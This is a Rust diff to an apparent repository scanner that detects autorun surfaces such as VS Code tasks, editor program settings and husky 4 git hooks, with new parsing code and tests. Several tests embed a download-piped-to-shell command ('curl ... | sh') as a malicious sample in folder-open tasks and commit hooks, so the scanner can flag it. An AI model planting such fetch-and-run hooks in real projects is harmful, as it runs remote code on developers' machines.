@@ -85,6 +85,8 @@ pub(crate) fn surfaces(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
         shell_surfaces(&mut cx, "autorun.envrc", false);
     } else if name == ".pre-commit-config.yaml" {
         pre_commit(&mut cx);
+    } else if name.starts_with(".huskyrc") {
+        huskyrc(&mut cx);
     } else if let Some(root) = dir_above(path, ".husky") {
         if lower[root.len()..]
             .trim_start_matches('/')
@@ -554,10 +556,7 @@ fn lower_program_settings(paths: &[&str], findings: &mut [Finding]) {
         if f.rule != "autorun.vscode-program" || f.severity != Severity::High {
             continue;
         }
-        let Some((_, value)) = f.seen.split_once(" = ") else {
-            continue;
-        };
-        let target = workspace_target(value, workspace_base(&f.path)).unwrap_or_default();
+        let target = workspace_target(&f.seen, workspace_base(&f.path)).unwrap_or_default();
         let tree = tree.get_or_insert_with(|| {
             let mut names = HashSet::new();
             for p in paths {
@@ -571,10 +570,10 @@ fn lower_program_settings(paths: &[&str], findings: &mut [Finding]) {
         });
         if !tree.contains(&target.to_ascii_lowercase()) {
             f.severity = Severity::Low;
-            f.why = "An editor setting names a path inside the repo, but nothing in the tree is \
-                     at that path, so the editor has no program of the repo's to run unless an \
-                     install or build step creates it."
-                .to_string();
+            f.why.push_str(
+                " The tree has nothing at that path, so this runs nothing of the repo's unless \
+                 an install or build step creates it.",
+            );
         }
     }
 }
@@ -1494,7 +1493,99 @@ fn package_json(cx: &mut Cx) {
         let line = key_line(text, anchor, name);
         cx.surface(rule, trigger, command, line, &dir, floor);
     }
+    if let Some(hooks) = v
+        .as_object()
+        .and_then(|o| o.get("husky"))
+        .and_then(Value::as_object)
+        .and_then(|h| h.get("hooks"))
+        .and_then(Value::as_object)
+    {
+        husky4_surfaces(cx, json_hooks(hooks, text));
+    }
 }
+
+/// The `(line, command)` pairs of a husky 4 `hooks` object: the string values.
+fn json_hooks(hooks: &Map, text: &str) -> Vec<(usize, String)> {
+    hooks
+        .iter()
+        .filter_map(|(_, v)| v.as_str())
+        .take(MAX_HUSKY4_HOOKS)
+        .map(|command| (str_line(text, command), command.to_string()))
+        .collect()
+}
+
+/// At most this many hooks are read from one husky 4 config.
+const MAX_HUSKY4_HOOKS: usize = 200;
+
+/// The hooks of a husky 4 config are run by git, so each is an opt-in surface, like a hook file in
+/// `.husky`. A stock `.git/hooks` stub is only the part that starts husky; this is what it runs.
+fn husky4_surfaces(cx: &mut Cx, hooks: Vec<(usize, String)>) {
+    let dir = parent(cx.path).to_string();
+    for (line, command) in hooks {
+        cx.surface(
+            "autorun.husky-hook",
+            Trigger::OptIn,
+            &command,
+            line,
+            &dir,
+            Severity::Info,
+        );
+    }
+}
+
+/// A `.huskyrc`, `.huskyrc.json`, `.huskyrc.yaml`, `.huskyrc.yml`, `.huskyrc.js` or `.huskyrc.cjs`:
+/// a `hooks` map of hook name to command, as JSON, YAML or a JavaScript object.
+fn huskyrc(cx: &mut Cx) {
+    let text = cx.text;
+    if let Ok(v) = jsonc::parse(text) {
+        if let Some(hooks) = v
+            .as_object()
+            .and_then(|o| o.get("hooks"))
+            .and_then(Value::as_object)
+        {
+            husky4_surfaces(cx, json_hooks(hooks, text));
+        }
+        return;
+    }
+    // YAML or a JavaScript module: the lines under `hooks`, indented deeper than it.
+    let lines: Vec<&str> = text.lines().collect();
+    let Some(start) = lines.iter().position(|l| {
+        let t = l.trim_start().trim_start_matches(['\'', '"']);
+        t.strip_prefix("hooks")
+            .map(|r| r.trim_start_matches(['\'', '"']).trim_start())
+            .is_some_and(|r| r.starts_with(':'))
+    }) else {
+        return;
+    };
+    let indent = |l: &str| l.len() - l.trim_start().len();
+    let base = indent(lines[start]);
+    let mut hooks = Vec::new();
+    for (i, l) in lines.iter().enumerate().skip(start + 1) {
+        let t = l.trim();
+        if t.is_empty() || t.starts_with(['#', '/']) {
+            continue;
+        }
+        if indent(l) <= base || hooks.len() >= MAX_HUSKY4_HOOKS {
+            break;
+        }
+        if let Some(c) = HUSKYRC_ENTRY.captures(t) {
+            let value = c[4].trim().trim_end_matches(',').trim();
+            let value = ['\'', '"', '`']
+                .iter()
+                .find_map(|q| value.strip_prefix(*q).and_then(|v| v.strip_suffix(*q)))
+                .unwrap_or(value);
+            if !value.is_empty() {
+                hooks.push((i + 1, value.to_string()));
+            }
+        }
+    }
+    husky4_surfaces(cx, hooks);
+}
+
+/// `name: command` with a bare, single-quoted or double-quoted name.
+static HUSKYRC_ENTRY: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"^(?:'([^']*)'|"([^"]*)"|([\w-]+))\s*:\s*(.+)$"#).expect("pattern compiles")
+});
 
 /// The rule, trigger and floor of an npm script name that starts by itself; `start` and `dev`
 /// are the data-file rule (floor HIGH), which the caller applies only to a script that runs data.
@@ -1812,21 +1903,26 @@ impl<'a> TaskWalk<'a> {
         }
         // The options a command runs under, nearest first: its platform block, the task, the file.
         let own = options_of(task);
-        out.extend(command_of(task, &[own, self.file_options]));
+        // A `process` task starts its command directly; any other runs it in the shell.
+        let in_shell = task.get("type").and_then(Value::as_str) != Some("process");
+        let command = command_of(task);
+        let task_runs = command.is_some();
+        out.extend(command);
+        if in_shell && task_runs {
+            out.extend(repo_shell(&[own, self.file_options]));
+        }
         self.envs
             .extend(own.and_then(|o| o.get("env")).and_then(Value::as_object));
         for os in ["windows", "linux", "osx"] {
             if let Some(block) = task.get(os).and_then(Value::as_object) {
                 let block_options = options_of(block);
-                let chain = [block_options, own, self.file_options];
                 // A block that sets only a shell runs the task's own command under it.
-                let command = command_of(block, &chain).or_else(|| {
-                    block_options
-                        .is_some_and(|o| o.contains_key("shell"))
-                        .then(|| command_of(task, &chain))
-                        .flatten()
-                });
+                let command = command_of(block);
+                let runs = command.is_some() || task_runs;
                 out.extend(command);
+                if in_shell && runs {
+                    out.extend(repo_shell(&[block_options, own, self.file_options]));
+                }
                 self.envs.extend(
                     block_options
                         .and_then(|o| o.get("env"))
@@ -1847,28 +1943,18 @@ impl<'a> TaskWalk<'a> {
     }
 }
 
-/// The program a task's shell is: `options.shell.executable`, and `options.shell.args`, each from
-/// the nearest of `chain` that sets it. A path into the repo gets a leading `./`, so the file the
-/// task starts shows up as a file the command runs.
-fn shell_prefix(chain: &[Option<&Map>]) -> Option<String> {
-    let shells: Vec<&Map> = chain
+/// The shell of a task when it is a file of the repo: `options.shell.executable` from the nearest
+/// of `chain` that sets one, as a command word (`./tools/sh`) and the string it came from. A bare
+/// name or an absolute path is the machine's shell and gives `None`. The shell is a file the task
+/// runs, a surface of its own; it is never put in front of the command, which stays as written.
+fn repo_shell(chain: &[Option<&Map>]) -> Option<(String, String)> {
+    let executable = chain
         .iter()
         .flatten()
         .filter_map(|o| o.get("shell").and_then(Value::as_object))
-        .collect();
-    let executable = shells
-        .iter()
         .find_map(|s| s.get("executable").and_then(Value::as_str))?;
-    let args = shells
-        .iter()
-        .find_map(|s| s.get("args").and_then(Value::as_array));
-    let mut words = vec![shell_word(executable)];
-    words.extend(
-        args.into_iter()
-            .flatten()
-            .filter_map(|w| w.as_str().map(str::to_string)),
-    );
-    Some(join_args(&words))
+    let word = shell_word(executable);
+    (word.starts_with("./") || word.starts_with("../")).then(|| (word, executable.to_string()))
 }
 
 /// A shell executable as a command word. A relative path (`${workspaceFolder}/x`, `x/y`, `.\x`)
@@ -1897,9 +1983,8 @@ fn shell_word(executable: &str) -> String {
     }
 }
 
-/// The command line of a task or of one of its platform blocks, with the string it came from. The
-/// shell of the nearest `options` in `chain` that names one starts it.
-fn command_of(task: &Map, chain: &[Option<&Map>]) -> Option<(String, String)> {
+/// The command line of a task or of one of its platform blocks, with the string it came from.
+fn command_of(task: &Map) -> Option<(String, String)> {
     let given = match task.get("command") {
         Some(Value::Object(o)) => o.get("value"),
         other => other,
@@ -1920,12 +2005,7 @@ fn command_of(task: &Map, chain: &[Option<&Map>]) -> Option<(String, String)> {
         _ => {
             if task.get("type").and_then(Value::as_str) == Some("npm") {
                 let script = task.get("script").and_then(Value::as_str)?;
-                let line = format!("npm run {script}");
-                let line = match shell_prefix(chain) {
-                    Some(prefix) => format!("{prefix} {line}"),
-                    None => line,
-                };
-                return Some((line, script.to_string()));
+                return Some((format!("npm run {script}"), script.to_string()));
             }
             return None;
         }
@@ -1942,9 +2022,6 @@ fn command_of(task: &Map, chain: &[Option<&Map>]) -> Option<(String, String)> {
         if !words.is_empty() {
             line = format!("{line} {}", join_args(&words));
         }
-    }
-    if let Some(prefix) = shell_prefix(chain) {
-        line = format!("{prefix} {line}");
     }
     Some((line, command))
 }
@@ -2135,31 +2212,37 @@ fn program_value_severity(value: &str, base: &str) -> Option<Severity> {
 fn settings_from(cx: &mut Cx, o: &Map) {
     let text = cx.text;
     let base = workspace_base(cx.path);
-    let mut worst: Option<(Severity, &str, String)> = None;
+    let mut worst: Option<(Severity, &str, String, String)> = None;
     for (key, value) in o.iter().filter(|(k, _)| is_program_key(k)).take(200) {
         for (shown, program) in program_values(key, value) {
             let Some(sev) = program_value_severity(&program, base) else {
                 continue;
             };
-            if worst.as_ref().is_none_or(|(s, _, _)| sev > *s) {
-                worst = Some((sev, key, format!("{shown} = {program}")));
+            if worst.as_ref().is_none_or(|(s, _, _, _)| sev > *s) {
+                worst = Some((sev, key, shown, program));
             }
         }
     }
-    if let Some((severity, key, seen)) = worst {
+    if let Some((severity, key, shown, program)) = worst {
         let why = if severity == Severity::High {
-            "An editor setting names a program inside the repo, so the editor or an extension \
-             runs code the repo supplies as soon as the folder opens."
+            format!(
+                "The editor setting {shown} names a program inside the repo, so the editor or an \
+                 extension runs code the repo supplies as soon as the folder opens."
+            )
         } else {
-            "An editor setting names a program outside the repo for the editor or an extension \
-             to run."
+            format!(
+                "The editor setting {shown} names a program outside the repo for the editor or \
+                 an extension to run."
+            )
         };
+        // `seen` is the path the setting names and nothing else: `lower_program_settings` reads
+        // it as the target.
         cx.find(
             severity,
             "autorun.vscode-program",
             key_line(text, 0, key),
-            why,
-            &seen,
+            &why,
+            &program,
             READ_FIRST,
         );
     }
@@ -5038,14 +5121,116 @@ call post.bat</PreBuildEvent>
 
     #[test]
     fn a_system_shell_in_a_task_leaves_the_command_as_it_was() {
-        let extra = r#","options":{"shell":{"executable":"/bin/bash","args":["-c"]}}"#;
-        let (s, _) = run(".vscode/tasks.json", &open_task(extra));
-        assert_eq!(commands(&s), ["/bin/bash -c echo hi"]);
-        assert!(s.iter().all(|x| shape::files_run(&x.command).is_empty()));
+        for executable in ["/bin/bash", "bash", "C:\\\\Windows\\\\cmd.exe", "~/bin/zsh"] {
+            let extra =
+                format!(r#","options":{{"shell":{{"executable":"{executable}","args":["-c"]}}}}"#);
+            let (s, _) = run(".vscode/tasks.json", &open_task(&extra));
+            assert_eq!(commands(&s), ["echo hi"], "{executable}");
+        }
         // The shell's own download-and-run is still seen.
         let evil = r#"{"tasks":[{"label":"t","command":"curl https://example.invalid/x | sh","options":{"shell":{"executable":"bash","args":["-c"]}},"runOptions":{"runOn":"folderOpen"}}]}"#;
         let (s, _) = run(".vscode/tasks.json", evil);
         assert_eq!(shape::classify(&s[0].command), Shape::FetchExec);
+    }
+
+    #[test]
+    fn a_task_shell_never_changes_the_command_the_task_runs() {
+        // The command and its file are still reached, whatever shell and args are set.
+        let text = r#"{"tasks":[{"label":"t","command":"node test/setup.js","options":{"shell":{"executable":"bash","args":["-c"]}},"runOptions":{"runOn":"folderOpen"}}]}"#;
+        let (s, _) = run(".vscode/tasks.json", text);
+        assert_eq!(commands(&s), ["node test/setup.js"]);
+        assert_eq!(shape::files_run(&s[0].command), ["test/setup.js"]);
+        // An npm task still names its script for `npm_run_target`.
+        let npm = r#"{"tasks":[{"label":"t","type":"npm","script":"build","options":{"shell":{"executable":"./tools/sh"}},"runOptions":{"runOn":"folderOpen"}}]}"#;
+        let (s, _) = run(".vscode/tasks.json", npm);
+        assert!(
+            commands(&s).contains(&"npm run build"),
+            "{:?}",
+            commands(&s)
+        );
+        assert_eq!(
+            shape::npm_run_target("npm run build").as_deref(),
+            Some("build")
+        );
+    }
+
+    #[test]
+    fn an_in_repo_task_shell_is_a_surface_of_its_own() {
+        let extra = r#","options":{"shell":{"executable":"./tools/sh","args":["-c"]}}"#;
+        let (s, _) = run(".vscode/tasks.json", &open_task(extra));
+        assert_eq!(commands(&s), ["echo hi", "./tools/sh"]);
+        let shell = &s[1];
+        assert_eq!(
+            (shell.rule, shell.trigger, shell.floor),
+            ("autorun.vscode-folder-open", Trigger::Open, Severity::Info)
+        );
+        assert_eq!(shape::files_run(&shell.command), ["tools/sh"]);
+        assert_eq!(shell.line, 1);
+        // A path from the workspace folder gets the same word, once, from every place it is set.
+        let both = r#"{"options":{"shell":{"executable":"${workspaceFolder}/tools/sh"}},"tasks":[{"label":"t","command":"echo hi","options":{"shell":{"executable":"tools/sh"}},"linux":{"options":{"shell":{"executable":"./tools/sh"}}},"runOptions":{"runOn":"folderOpen"}}]}"#;
+        let (s, _) = run(".vscode/tasks.json", both);
+        assert!(s.iter().filter(|x| x.command == "./tools/sh").count() >= 1);
+        assert!(
+            s.iter()
+                .all(|x| x.command == "echo hi" || x.command == "./tools/sh")
+        );
+    }
+
+    #[test]
+    fn husky_4_config_is_read_as_hook_surfaces() {
+        let evil = "curl https://example.invalid/x | sh";
+        let package = format!(
+            r#"{{"name":"x","husky":{{"hooks":{{"pre-commit":"lint-staged","commit-msg":"{evil}","pre-push":1}}}}}}"#
+        );
+        let json = format!(r#"{{"hooks":{{"pre-commit":"lint-staged","commit-msg":"{evil}"}}}}"#);
+        let yaml = format!("hooks:\n  pre-commit: lint-staged\n  commit-msg: \"{evil}\"\n");
+        let js = format!(
+            "module.exports = {{\n  hooks: {{\n    'pre-commit': 'lint-staged',\n    \"commit-msg\": \"{evil}\",\n  }},\n}}\n"
+        );
+        for (path, text) in [
+            ("package.json", package.as_str()),
+            ("app/package.json", package.as_str()),
+            (".huskyrc", json.as_str()),
+            (".huskyrc.json", json.as_str()),
+            (".HuskyRC.JSON", json.as_str()),
+            (".huskyrc", yaml.as_str()),
+            (".huskyrc.yaml", yaml.as_str()),
+            (".huskyrc.yml", yaml.as_str()),
+            (".huskyrc.js", js.as_str()),
+            (".huskyrc.cjs", js.as_str()),
+        ] {
+            let (s, _) = run(path, text);
+            assert_eq!(commands(&s), ["lint-staged", evil], "{path}");
+            all_are(&s, "autorun.husky-hook", Trigger::OptIn, Severity::Info);
+            let dir = path.rsplit_once('/').map_or("", |(d, _)| d);
+            assert!(s.iter().all(|x| x.dir == dir), "{path}");
+        }
+        // The command is rated like any other: a download piped to a shell is HIGH at OptIn.
+        let (s, _) = run("package.json", &package);
+        assert_eq!(
+            shape::severity(s[1].trigger, shape::classify(&s[1].command), None),
+            Severity::High
+        );
+        // Nothing to read, nothing found.
+        for (path, text) in [
+            ("package.json", r#"{"husky":{}}"#),
+            ("package.json", r#"{"husky":{"hooks":[]}}"#),
+            ("package.json", r#"{"husky":"x"}"#),
+            (".huskyrc", "{}"),
+            (".huskyrc.yaml", "other: 1\n"),
+            (".huskyrc.js", "module.exports = {}\n"),
+        ] {
+            assert!(run(path, text).0.is_empty(), "{path} {text}");
+        }
+    }
+
+    #[test]
+    fn a_process_task_ignores_the_shell_and_a_task_without_a_command_runs_none() {
+        let process = r#"{"tasks":[{"label":"t","type":"process","command":"echo","args":["hi"],"options":{"shell":{"executable":"./tools/sh"}},"runOptions":{"runOn":"folderOpen"}}]}"#;
+        let (s, _) = run(".vscode/tasks.json", process);
+        assert_eq!(commands(&s), ["echo hi"]);
+        let none = r#"{"tasks":[{"label":"t","options":{"shell":{"executable":"./tools/sh"}},"runOptions":{"runOn":"folderOpen"}}]}"#;
+        assert!(run(".vscode/tasks.json", none).0.is_empty());
     }
 
     fn task_env(extra: &str) -> Vec<Finding> {
@@ -5577,6 +5762,37 @@ call post.bat</PreBuildEvent>
         let text = r#"{"git.path": "./bin/git"}"#;
         let near = program_findings(&[settings, "bin/gitx"], settings, text);
         assert!(near[0].severity < Severity::High);
+    }
+
+    #[test]
+    fn the_target_of_a_program_setting_is_its_own_field() {
+        let settings = ".vscode/settings.json";
+        // `seen` is the path and nothing else; the key is in the explanation.
+        let text = r#"{"git.path": "./bin/git"}"#;
+        let found = program_findings(&[settings, "bin/git"], settings, text);
+        assert_eq!(found[0].seen, "./bin/git");
+        assert!(found[0].why.contains("git.path"), "{}", found[0].why);
+        let nested = r#"{"go.alternateTools": {"go": "./bin/go"}}"#;
+        let found = program_findings(&[settings, "bin/go"], settings, nested);
+        assert_eq!(found[0].seen, "./bin/go");
+        assert!(
+            found[0].why.contains("go.alternateTools.go"),
+            "{}",
+            found[0].why
+        );
+        // A path that holds the text ` = ` is still found as it is written.
+        let odd = r#"{"git.path": "./a = b/git"}"#;
+        let found = program_findings(&[settings, "a = b/git"], settings, odd);
+        assert_eq!(found[0].severity, Severity::High);
+        let found = program_findings(&[settings, "b/git"], settings, odd);
+        assert!(found[0].severity < Severity::High);
+        // Lowering keeps what the finding said and adds why it is lower.
+        assert!(found[0].why.contains("git.path"), "{}", found[0].why);
+        assert!(
+            found[0].why.contains("nothing at that path"),
+            "{}",
+            found[0].why
+        );
     }
 
     #[test]
